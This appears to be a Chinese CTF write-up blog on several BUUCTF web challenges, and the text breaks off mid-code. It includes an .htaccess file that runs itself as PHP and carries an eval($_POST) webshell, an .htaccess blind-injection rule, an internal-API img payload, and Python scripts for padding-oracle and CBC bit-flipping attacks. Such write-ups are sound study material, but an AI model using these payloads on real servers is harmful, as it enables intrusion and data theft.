<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /admin HTTP/1.1</span><br><span class="line">Host: 066a7b81-c575-4196-b7ca-281b413713ca.node4.buuoj.cn:81</span><br><span class="line">Content-Length: 138</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://066a7b81-c575-4196-b7ca-281b413713ca.node4.buuoj.cn:81</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.57</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://066a7b81-c575-4196-b7ca-281b413713ca.node4.buuoj.cn:81/admin</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: token=s%3Aj%3A%7B%22username%22%3A%22admin%22%2C%22files%22%3A%5B%5D%2C%22isAdmin%22%3Atrue%7D.F56WSi1msokS7QwqhYWcJm%2FBhe1UiZ%2FxOtKnM%2BaehVU</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">content[]=%3Cimg%20src%3D%22http%3A%2F%2F127.0.0.1%3A8888%2Fapi%2Ffiles%3Fusername%3Dadmin%26filename%3D.%2Fflag%26checksum%3D114514%22%3E</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685623377538-2f93623d-f135-45d4-88a2-54c3524097ec.png#averageHue=%23828281&clientId=uab4b7e6d-cb7e-4&from=paste&height=613&id=uaa9fb3a5&originHeight=766&originWidth=1656&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=117198&status=done&style=none&taskId=u099b170e-94b3-4cf5-822b-159b50e920c&title=&width=1324.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685623407598-e662b469-e0b6-41d3-b2a6-ba7ede135cd6.png#averageHue=%23fefdfd&clientId=uab4b7e6d-cb7e-4&from=paste&height=338&id=u0f2e686e&originHeight=422&originWidth=1893&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=35528&status=done&style=none&taskId=u29bf36d2-f7bf-423a-9020-0d15c5899b1&title=&width=1514.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685623399969-b9ec58a2-6172-49ea-b14f-e1a12f7b56cd.png#averageHue=%23fafafa&clientId=uab4b7e6d-cb7e-4&from=paste&height=589&id=ud1d1cb98&originHeight=736&originWidth=1594&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26436&status=done&style=none&taskId=u6aed52dd-dac0-426a-a0df-2597b1ea32d&title=&width=1275.2" alt="image.png"></p>
<h1 id="JMCTF-2021-UploadHub"><a href="#JMCTF-2021-UploadHub" class="headerlink" title="[JMCTF 2021]UploadHub"></a>[JMCTF 2021]UploadHub</h1><p>考点：.htaccess盲注、文件上传<br>这一题的考点比较好玩，可以用htaccess文件来打盲注，题目给了源码，就不放出来了，没啥过滤的文件上传，怪怪的。<br>传htaccess过去后内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;If &quot;file(&#x27;/flag&#x27;)=~ &#x27;/flag&#123;/&#x27;&quot;&gt;</span><br><span class="line">ErrorDocument 404 &quot;boogipop&quot;</span><br><span class="line">&lt;/If&gt;</span><br></pre></td></tr></table></figure>
<p>如果匹配到就返回一个404界面，内容是boogipop，这就可以拿来当盲注了。<br>或者直接包含.htaccess</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch .htaccess&gt;</span><br><span class="line">SetHandler application/x-httpd-php </span><br><span class="line">Require all granted  </span><br><span class="line">php_flag engine on	</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"></span><br><span class="line">php_value auto_prepend_file .htaccess</span><br><span class="line">#&lt;?php eval($_POST[&#x27;dmind&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>
<p>校园网有waf，不传了。</p>
<h1 id="NPUCTF2020-web🐕"><a href="#NPUCTF2020-web🐕" class="headerlink" title="[NPUCTF2020]web🐕"></a>[NPUCTF2020]web🐕</h1><p>考点：CBC字节翻转攻击、Padding Oracle攻击<br>攻击原理可以参考这篇文章：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11114958.html">https://www.cnblogs.com/tr1ple/p/11114958.html</a><br>简单地说一下，CBC加密方式为分组加密，一般为16一组<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685711628558-9cd84f8e-7dd0-4c4d-a715-c0de6bf289a0.png#averageHue=%23f8f8f8&clientId=u3b2a233d-5e28-4&from=paste&id=u2b7e34bb&originHeight=462&originWidth=1020&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=96828&status=done&style=none&taskId=ub45d5f96-45b7-4a42-b491-4261a21625c&title=" alt="image.png"><br>初始时有初始向量，密钥，以及明文，明文与初始向量异或以后得到中间明文，然后其再和密钥进行加密将得到密文，得到的密文将作为下一个分组的初始向量，与下一个分组的明文进行异或得到的二组的中间明文，依次类推。<br>然后解密过程也是如此，逆着来罢了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685711656986-5e9583d4-6bc7-4787-8cd5-0bd0c0a65253.png#averageHue=%23f8f8f8&clientId=u3b2a233d-5e28-4&from=paste&id=u57bbefbe&originHeight=386&originWidth=1023&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=72959&status=done&style=none&taskId=ub325cb63-9fe1-454b-8c2b-0bd8e6d4b4d&title=" alt="image.png"><br>假如我们想要进行padding oracle攻击获取明文，我们只需要记住一个公式<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685711709768-b4de667e-7588-40ba-b28c-efc898758cdf.png#averageHue=%23e5d8cf&clientId=u3b2a233d-5e28-4&from=paste&height=502&id=u2f7bdd51&originHeight=628&originWidth=1119&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=66941&status=done&style=none&taskId=ud4ad467b-234e-42c3-8c50-2fcc5c50a9d&title=&width=895.2" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">我摊牌了，就是懒得写前端</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);   <span class="comment"># $key,$flag</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;METHOD&quot;</span>, <span class="string">&quot;aes-128-cbc&quot;</span>);  <span class="comment">//定义加密方式</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;SECRET_KEY&quot;</span>, <span class="variable">$key</span>);    <span class="comment">//定义密钥</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;IV&quot;</span>,<span class="string">&quot;6666666666666666&quot;</span>);    <span class="comment">//定义初始向量 16个6</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;BR&quot;</span>,<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:./index.php?source=1&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#var_dump($GLOBALS);   //听说你想看这个？</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_encrypt</span>(<span class="params"><span class="variable">$iv</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;--------encrypt---------&quot;</span>.BR;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;IV:&#x27;</span>.<span class="variable">$iv</span>.BR;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$data</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>)).BR;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aes_decrypt</span>(<span class="params"><span class="variable">$iv</span>,<span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data</span>),METHOD,SECRET_KEY,OPENSSL_RAW_DATA,<span class="variable">$iv</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;False&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;method&#x27;</span>]==<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$iv</span> = IV;</span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$flag</span>;    </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">aes_encrypt</span>(<span class="variable">$iv</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;method&#x27;</span>]==<span class="string">&quot;decrypt&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$iv</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;iv&#x27;</span>];</span><br><span class="line">    <span class="variable">$data</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">aes_decrypt</span>(<span class="variable">$iv</span>,<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;我摊牌了，就是懒得写前端&quot;</span>.BR;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]==<span class="number">1</span>)<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>题目源码如上，这一题就是padding oracle注入，已知初始向量和密文，让我们获取明文，这里是大佬写的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment"># b&#x27;\x97.\xda\xb8\xa5P\t\x95\xae\x9b\xf5\xbf\xe2\x8b.&lt;&#x27;</span></span><br><span class="line">CYPHERTEXT = base64.b64decode(<span class="string">&quot;ly7auKVQCZWum/W/4osuPA==&quot;</span>)</span><br><span class="line"><span class="comment"># initialization vector</span></span><br><span class="line">IV = <span class="string">&quot;6666666666666666&quot;</span></span><br><span class="line"><span class="comment"># PKCS7 16个字节为1组</span></span><br><span class="line">N = <span class="number">16</span></span><br><span class="line"><span class="comment"># intermediaryValue ^ IV = plainText</span></span><br><span class="line">inermediaryValue = <span class="string">&quot;&quot;</span></span><br><span class="line">plainText = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 爆破时不断需要更改的iv</span></span><br><span class="line">iv = <span class="string">&quot;&quot;</span></span><br><span class="line">URL = <span class="string">&quot;http://bbe51fc0-eeac-4b1b-9f8d-c460bb9270e8.node4.buuoj.cn:81/index.php?source=1&amp;method=decrypt&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    用于输出两个字符串对位异或的结果</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i]) ^ <span class="built_in">ord</span>(b[i])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a))])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> step <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, N + <span class="number">1</span>):</span><br><span class="line">    padding = <span class="built_in">chr</span>(step) * (step - <span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(step,end=<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        iv由三部分组成：</span></span><br><span class="line"><span class="string">            待爆破位置 chr(0)*(N-step) </span></span><br><span class="line"><span class="string">            正在爆破位置 chr(i) </span></span><br><span class="line"><span class="string">            使 iv[N-step+1:] ^ inermediaryValue = padding 的 xor(padding,inermediaryValue)</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        iv = <span class="built_in">chr</span>(<span class="number">0</span>)*(N-step)+<span class="built_in">chr</span>(i)+xor(padding,inermediaryValue)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;data&quot;</span>: <span class="string">&quot;ly7auKVQCZWum/W/4osuPA==&quot;</span>,</span><br><span class="line">            <span class="string">&quot;iv&quot;</span>: iv</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(URL,data = data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> r.text !=<span class="string">&quot;False&quot;</span>:</span><br><span class="line">            inermediaryValue = xor(<span class="built_in">chr</span>(i),<span class="built_in">chr</span>(step)) + inermediaryValue</span><br><span class="line">            <span class="built_in">print</span>(inermediaryValue)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">plainText = xor(inermediaryValue,IV)</span><br><span class="line"><span class="built_in">print</span>(plainText)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685712608105-fb891013-a8fc-4e9d-9c44-182dc2c8c95c.png#averageHue=%23222327&clientId=u3b2a233d-5e28-4&from=paste&height=606&id=u02d6f481&originHeight=757&originWidth=1748&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=96133&status=done&style=none&taskId=u84d6f094-9490-4ffd-b92e-07fe19b49c6&title=&width=1398.4" alt="image.png"><br>继续访问<code>FlagIsHere.php</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">eFbQsEEn3mMvggbTmA262Q==</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;config.php&#x27;</span>);    <span class="comment">//$fl4g</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;METHOD&quot;</span>, <span class="string">&quot;aes-128-cbc&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;SECRET_KEY&quot;</span>, <span class="string">&quot;6666666&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_iv</span>(<span class="params"></span>)</span>&#123;    <span class="comment">//生成随机初始向量IV</span></span><br><span class="line">    <span class="variable">$random_iv</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">16</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$random_iv</span>.=<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$random_iv</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$lalala</span> = <span class="string">&#x27;piapiapiapia&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;Identity&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;iv&#x27;</span>] = <span class="title function_ invoke__">get_iv</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;Identity&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$lalala</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$_SESSION</span>[<span class="string">&#x27;iv&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;iv&#x27;</span>]).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;iv&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$tmp_id</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;Identity&#x27;</span>]), METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;iv&#x27;</span>]));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$tmp_id</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$tmp_id</span> ===<span class="string">&#x27;weber&#x27;</span>)<span class="keyword">die</span>(<span class="variable">$fl4g</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里涉及一个CBC字节翻转，翻转的原理如下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685712646193-7bde192c-8868-410a-a18c-d12bd377178c.png#averageHue=%23fafafa&clientId=u3b2a233d-5e28-4&from=paste&height=860&id=u3b77e495&originHeight=1075&originWidth=1494&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=136734&status=done&style=none&taskId=u4267fe69-6982-414d-ab14-d806bc92d3b&title=&width=1195.2" alt="image.png"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">target = <span class="string">b&#x27;weber\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b&#x27;</span></span><br><span class="line">orginal = <span class="string">b&#x27;piapiapiapia\x04\x04\x04\x04&#x27;</span></span><br><span class="line">iv = base64.b64decode(<span class="string">&#x27;eFbQsEEn3mMvggbTmA262Q==&#x27;</span>)<span class="comment">#替换</span></span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    result+=<span class="built_in">bytes</span>([target[i] ^ iv[i] ^ orginal[i]])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(result))</span><br></pre></td></tr></table></figure>
<p>用该脚本进行翻转<br>获取恶意的IV了<code>f1rTpVpNpQFF+WS5lwK11g==</code><br>输入获得<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685712822226-2ebb6742-f3c9-49e0-a8be-36a65dc25159.png#averageHue=%23c6c6c6&clientId=u3b2a233d-5e28-4&from=paste&height=1112&id=u08d94325&originHeight=1390&originWidth=1628&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=60487&status=done&style=none&taskId=ua31f25b9-1183-422b-98cd-6616e9a38e0&title=&width=1302.4" alt="image.png"><br>然后获取一个class文件，直接运行输出flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1685712841367-519348e5-2585-4821-b1b0-fd1020e960b6.png#averageHue=%23272926&clientId=u3b2a233d-5e28-4&from=paste&height=657&id=u68e46fd2&originHeight=821&originWidth=1861&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2274677&status=done&style=none&taskId=u434a8da4-4b2e-4d6f-9f39-91cb429decd&title=&width=1488.8" alt="image.png"></p>
<h1 id="网鼎杯-2020-半决赛-faka"><a href="#网鼎杯-2020-半决赛-faka" class="headerlink" title="[网鼎杯 2020 半决赛]faka"></a>[网鼎杯 2020 半决赛]faka</h1><p>考点：代码审计、CMS、任意文件上传<br>源码已经给了，漏洞点定位在后台的文件上传<br>Plugs.php有如下节选内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * 通用文件上传</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span> \think\response\Json</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">   <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="variable">$file</span> = <span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">file</span>(<span class="string">&#x27;file&#x27;</span>);</span><br><span class="line">       <span class="variable">$ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file</span>-&gt;<span class="title function_ invoke__">getInfo</span>(<span class="string">&#x27;name&#x27;</span>), <span class="number">4</span>));</span><br><span class="line">       <span class="variable">$md5</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;md5&#x27;</span>), <span class="number">16</span>);</span><br><span class="line">       <span class="variable">$filename</span> = <span class="title function_ invoke__">join</span>(<span class="string">&#x27;/&#x27;</span>, <span class="variable">$md5</span>) . <span class="string">&quot;.<span class="subst">&#123;$ext&#125;</span>&quot;</span>;</span><br><span class="line">       <span class="keyword">if</span> (<span class="title function_ invoke__">strtolower</span>(<span class="variable">$ext</span>) == <span class="string">&#x27;php&#x27;</span> || !<span class="title function_ invoke__">in_array</span>(<span class="variable">$ext</span>, <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">sysconf</span>(<span class="string">&#x27;storage_local_exts&#x27;</span>))))) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span> =&gt; <span class="string">&#x27;ERROR&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;文件上传类型受限&#x27;</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// 文件上传Token验证</span></span><br><span class="line">       <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;request-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;token&#x27;</span>) !== <span class="title function_ invoke__">md5</span>(<span class="variable">$filename</span> . <span class="title function_ invoke__">session_id</span>())) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;code&#x27;</span> =&gt; <span class="string">&#x27;ERROR&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;文件上传验证失败&#x27;</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">// 文件上传处理</span></span><br><span class="line">       <span class="keyword">if</span> ((<span class="variable">$info</span> = <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">move</span>(<span class="string">&#x27;static&#x27;</span> . DS . <span class="string">&#x27;upload&#x27;</span> . DS . <span class="variable">$md5</span>[<span class="number">0</span>], <span class="variable">$md5</span>[<span class="number">1</span>], <span class="literal">true</span>))) &#123;</span><br><span class="line">           <span class="keyword">if</span> ((<span class="variable">$site_url</span> = <span class="title class_">FileService</span>::<span class="title function_ invoke__">getFileUrl</span>(<span class="variable">$filename</span>, <span class="string">&#x27;local&#x27;</span>))) &#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="title function_ invoke__">json</span>([<span class="string">&#x27;data&#x27;</span> =&gt; [<span class="string">&#x27;site_url&#x27;</span> =&gt; <span class="variable">$site_url</span>], <span class="string">&#x27;code&#x27;</span> =&gt; <span class="string">&#x27;SUCCESS&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;文件上传成功&#x27;</span>]);</span><br><span 